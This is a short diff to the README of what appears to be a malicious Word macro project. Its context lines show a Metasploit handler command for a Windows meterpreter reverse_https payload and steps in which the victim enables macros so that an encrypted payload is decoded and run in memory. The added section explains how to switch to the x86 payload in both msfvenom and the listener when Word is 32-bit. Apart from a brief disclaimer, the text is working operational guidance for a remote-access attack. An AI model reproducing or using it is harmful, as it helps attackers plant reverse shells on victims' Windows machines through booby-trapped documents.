@@ -28,6 +28,9 @@ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterp
 - Enable macros when prompted
 - The encrypted payload is decoded and executed in memory
 
+### 6. Compatibility Note
+If Microsoft Word is running in 32-bit, the payload and handler must be adjusted for x86 compatibility by replacing windows/x64/meterpreter/reverse_https with windows/meterpreter/reverse_https in both the shellcode generation with msfvenom and the listener configuration in Metasploit.
+
 ## Disclaimer
 This project is intended for educational and authorized penetration testing purposes only. Unauthorized use is strictly prohibited.
 
